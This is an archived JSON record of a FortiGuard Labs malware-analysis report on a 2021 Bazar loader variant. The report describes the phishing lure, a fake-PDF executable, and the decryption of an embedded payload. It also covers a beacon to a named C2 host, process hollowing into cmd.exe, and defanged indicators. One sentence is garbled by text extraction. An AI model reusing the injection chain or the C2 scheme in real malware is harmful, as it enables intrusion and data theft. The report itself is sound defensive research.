{
    "id": "5e17045c-c115-4e34-b912-6d2ae95410af",
    "created_at": "2023-01-12T15:11:05.221224Z",
    "updated_at": "2025-03-27T02:05:44.934594Z",
    "deleted_at": null,
    "sha1_hash": "f24a78e7d92359696fbb10e3e1b2490ed8dd35a0",
    "title": "2021-02-12 - New Bazar Trojan Variant is Being Spread in Recent Phishing Campaign – Part I",
    "authors": "",
    "file_creation_date": "2022-05-29T10:46:38Z",
    "file_modification_date": "2022-05-29T10:46:38Z",
    "file_size": 240722,
    "plain_text": "# New Bazar Trojan Variant is Being Spread in Recent Phishing Campaign – Part I\n\n**[fortinet.com/blog/threat-research/new-bazar-trojan-variant-is-being-spread-in-recent-phishing-campaign-part-I](https://www.fortinet.com/blog/threat-research/new-bazar-trojan-variant-is-being-spread-in-recent-phishing-campaign-part-I)**\n\n**[FortiGuard Labs Threat Research Report](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)**\n\n**Affected platforms: Microsoft Windows**\n\n**Impacted parties:  Windows Users**\n\n**Impact:           Control and Collect sensitive information from victim’s device, as well as delivering other malware.**\n\n**Severity level:      Critical**\n\n\nFebruary 12, 2021\n\n\nBazar (which has been classified as the Team9 malware family being developed by the group behind Trickbot) is a backdoor Trojan designed\nto target a device, collect sensitive information, control the system via commands, and deliver malware. Last year, it was observed delivering\nthe [TrickBot malware.](https://www.fortinet.com/blog/threat-research/new-variant-of-trickbot-being-spread-by-word-document?utm_source=blog&utm_campaign=2020-q1-new-variant-of-trickbot-being-spread-by-word-document)\n\nFortiGuard Labs recently noticed a suspicious email through the SPAM monitoring system. This email was designed to entice a victim into\nopening a web page to download an executable file. Additional research on this executable file found that it is a new variant of Bazar. In this\npost you can expect to learn what new techniques this Bazar uses to perform anti-analysis, how it communicates with its C2 server, what\nsensitive data it is able to collect from the victim’s device and how it is able to deliver other malware onto the victim’s system.\n\n## Phishing Email and Download Page\n\nTo validate our assessment, we captured some of Bazar’s previous [phishing emails and their content are similar. They lure the recipient into](https://www.fortinet.com/resources/cyberglossary/phishing?utm_source=blog&utm_campaign=2020-q4-phishing)\nopening a webpage to view a pdf version of a fake bonus report, fake customer complaint report, or fake billing statement, etc. You can see\ntwo examples in the following Figures, which were captured on Jan 20 and Jan 27, 2021.\n\nFigure 1.1 Bazar phishing email captured on Jan 20, 2021\n\nFigure 1.2 Bazar phishing email on Jan 27, 2021\n\nOnce the victim clicks any hyperlink in the email, it brings the victim to a malicious webpage, as shown in Figure 1.3.\n\nFigure 1.3 Webpage that downloads the Bazar malware\n\nThere are three hyperlinks, circled on the webpage image above, that all pointing to the same download link. One instance of the download\nhyperlinks looks like this:\n\n_https[:]//doc-14-6g-_\n_docs[.]googleusercontent.com/docs/securesc/m4jlrke7n9hladu0avuh39vorb58jrve/fgl9fo0g0p5o35at5vboiccqq552hmqf/1611168150000/16223329_\n_8ISzpp4XoG-jfSs?_\n_e=download&authuser=0&nonce=nvmpahs236rou&user=11832846407481787782&hash=5ctf3a9bet7iv3njj965vh0c16pumigi_\n\n\n-----\n\n## Downloaded Bazar Loader\n\nThe downloaded file (Priview_report20-01[.]exe) is an executable file that uses a PDF document-like icon to deceive the intended victim. By\ndefault, Windows hides the actual extension (for example, “.exe”).\n\nFigure 2.1 shows a quick analysis of the file. The left side of the image shows what the victim sees, and the right side shows what the\nresearchers see in a PE analysis tool. (PE, or Portable Executable, is the native format of executable binaries [DLLs, drivers and programs] for\nthe Microsoft Windows® 32-bit operating systems.)\n\nFigure 2.1 The downloaded Bazar loader in an analysis tool\n\nThe victim may assume the file is a real PDF document and double click on it to open the “report” without realizing that an executable file is\nbeing run in the background.\n\nThe downloaded executable file is recognized as a 64-bit file in the analysis tool, which means it is only able to execute on 64-bit Microsoft\nWindows Operating Systems.\n\nAfter analyzing this file, I realized this file is a loader of Bazar.\n\nOnce the Bazar loader starts, an encrypted Resource that hides in the “Font Directory” with the ID “339” (hex 153H) is loaded into its memory.\nIn Figure 2.2 you can see the Resource data shown in an analysis tool.\n\nFigure 2.2. Encrypted Resource 339 of Bazar loader\n\nDecrypting the Resource data uncovers a piece of ASM (assembly language) code and a PE file. This ASM code, called by the Bazar loader,\ndynamically deploys the PE file into memory and executes it. Figure 2.3 is a screenshot of a debugger, showing where the ASM code was\nabout to call the OEP (Original Entry Point) of the deployed PE file. This PE file is the real Bazar loader.\n\nFigure 2.3. Calling the OEP of the deployed PE file\n\n## Deeper Dive into the Bazar Loader\n\nThe real Bazar loader then initiates communication with its C2 server. The host and URL strings are decrypted from constant data in that stack.\n\nFigure 3.1. A display of the decrypted host string of the C2 server\n\nFigure 3.1 above shows the just decrypted C2 host string with the port number (englewoodcarwashh[.]us:443) in the memory sub-window. It\nlater calls the API getaddrinfo(C2_host_string) to obtain the IP address of the C2 server.\n\nIt sends a GET request with the URL “/cgi-bin/req5” to its C2 server using the SSL protocol. Figure 3.2 is a screenshot of a debugger showing\nthe moment it was about to call the API EncryptMessage() to encrypt the entire GET request.\n\nFigure 3.2. An encrypted packet sent to the C2 server\n\nI copied the packet below for a clearer view:\n\n_GET /cgi-bin/req5 HTTP/1.1_\n\n_Host: englewoodcarwashh[.]us_\n\n_User-Agent: user_agent_\n\n_Date: Wed, 20 Jan 2021 21:05:11 GMT_\n\n_rvpoft: z3qTFLIkBrYVD3igIKy1kAS99rBL0V35k8NKFUG1dQGVw4ICpFV8y9cAiVS%2FAu6RTpaHgZRVuWMsnLVhpTZaRMdnvCDvJrOqKha_\n_Connection: Keep-Alive_\n\nYou may have noticed that the value of “rvpoft” is base64 encoded. It was a hash of the “Date:” value (“Wed, 20 Jan 2021 21:05:11 GMT”).\nBy calculating the hash of “Date:” and comparing it with the hash value that “rvpoft” carries at the C2 server, it is able to verify if the packet is\nfrom its true client.\n\nFigure 3.3. The decrypted Bazar payload returned from the C2 server\n\nOnce it passes packet verification, the C2 server replies with an encrypted Bazar payload to the client (Bazar loader). This is decrypted in the\nAPI function BCryptDecrypt() that is called by the Bazar loader. Figure 3.3, above, shows the just-decrypted Bazar payload PE file in the\nmemory sub-window at the bottom.\n\nThe payload file is an EXE file, which will be injected into a newly-created “cmd.exe” process to hide its real process from being noticed by the\nvictim. To do this, the Bazar loader calls API CreateProcessA() to create a “cmd” process with a CreateFlags of value “0x80014” that is a\ncombination of “EXTENDED_STARTUPINFO_PRESENT, CREATE_NEW_CONSOLE, and CREATE_SUSPENDED”. Refer to Figure 3.4,\nbelow, for more details.\n\nFigure 3.4. Creating the “cmd.exe” process by calling the API CreateProcessA()\n\n\n-----\n\no ject t e a a pay oad to t e e y c eated c d e e p ocess a d e ecute t, t eeds to ca so e e e a t s, e\nNtGetContextThread(), VirtualAllocEx(), NtUnmapViewOfSection(), NtWriteVirtualMemory(), ZwSetContextThread(), and ZwResumeThread().\n\n## Conclusion\n\n[This is part I of our analysis of this new Bazar variant. In this post, I explained how a Bazar loader was spread in a phishing campaign. I](https://www.fortinet.com/resources/cyberglossary/phishing?utm_source=blog&utm_campaign=2020-q4-phishing)\nshowed how the Bazar loader communicates with its C2 server to download the Bazar payload. I also presented how the payload file is\ndeployed in a newly-created “cmd.exe” process.\n\n[I will provide an analysis of the Bazar payload file running in “cmd.exe” in part II of this analysis. In that report you will learn how Bazar](https://www.fortinet.com/blog/threat-research/new-bazar-trojan-variant-is-being-spread-in-recent-phishing-campaign-part-II)\ncommunicates to its C2 server and what actions Bazar can perform on a victim’s device via commands received from its C2 server.\n\n## Fortinet Protections\n\nFortinet customers are already protected from this Bazar variant with FortiGuard’s Web Filtering and AntiVirus services as follows:\n\nThe Bazar loader download URLs are rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\n\nThe downloaded files are detected as \"W64/Bazar.CFI!tr\" and blocked by the FortiGuard AntiVirus service.\n\n[The FortiGuard AntiVirus service is supported by FortiGate,](https://www.fortinet.com/products/next-generation-firewall.html?utm_source=blog&utm_campaign=2018-q2-fortigate-main-page) [FortiMail, FortiClient and FortiEDR. The Fortinet AntiVirus engine is a part of each](https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=2018-q2-fortimail-main-page)\nof those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\n[We also suggest our readers to go through the free NSE training -- NSE 1 – Information Security Awareness, which has a module on Internet](https://training.fortinet.com/local/staticpage/view.php?page=nse_1&utm_source=blog&utm_campaign=2020-q2-nse-1)\nthreats designed to help end users learn how to identify and protect themselves from phishing attacks.\n\n## IOCs:\n\n**URLs**\n\nhxxps[:]//complaintsreport2020[.]gr8[.]com/\n\nhxxps[:]//app[.]getresponse[.]com/lpc_unpublish.html\n\nhxxps[:]//englewoodcarwashh[.]us:443/cgi-bin/req5\n\n**Sample SHA-256**\n\n[Preview_report20-01.exe]\n\n0BFB64DFF37DD50449AF75EC204F0B4981AC3B16790458F6A492C7B27905A9A7\n\n[Print-report27-01.exe]\n\n6E6C0EBC1BB2D99CE358612572F4BCF52578527EEEF6629FFCE81B35F5FA1A99\n\n**References:**\n\nhttps://malpedia.caad.fkie.fraunhofer.de/details/win.bazarbackdoor\n\n_[Learn more about FortiGuard Labs threat research and the FortiGuard Security Subscriptions and Services portfolio.](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)_\n\n_Learn more about Fortinet’s_ _[free cybersecurity training initiative or about the Fortinet](https://www.fortinet.com/blog/business-and-technology/fortinet-offers-free-cybersecurity-training-courses?utm_source=blog&utm_campaign=free-cybersecurity-training-courses)_ _[NSE Training program,](https://training.fortinet.com/?utm_source=blog&utm_campaign=nse-institute)_ _[Security Academy program,](https://training.fortinet.com/local/staticpage/view.php?page=fnsa&utm_source=blog&utm_campaign=fnsa)_\n_[and Veterans program.](https://www.fortinet.com/corporate/careers/vets.html?utm_source=blog&utm_campaign=fortivet)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-12 - New Bazar Trojan Variant is Being Spread in Recent Phishing Campaign – Part I.pdf"
    ],
    "report_names": [
        "2021-02-12 - New Bazar Trojan Variant is Being Spread in Recent Phishing Campaign – Part I.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536265,
    "ts_updated_at": 1743041144,
    "ts_creation_date": 1653821198,
    "ts_modification_date": 1653821198,
    "files": {
        "pdf": "https://archive.orkl.eu/f24a78e7d92359696fbb10e3e1b2490ed8dd35a0.pdf",
        "text": "https://archive.orkl.eu/f24a78e7d92359696fbb10e3e1b2490ed8dd35a0.txt",
        "img": "https://archive.orkl.eu/f24a78e7d92359696fbb10e3e1b2490ed8dd35a0.jpg"
    }
}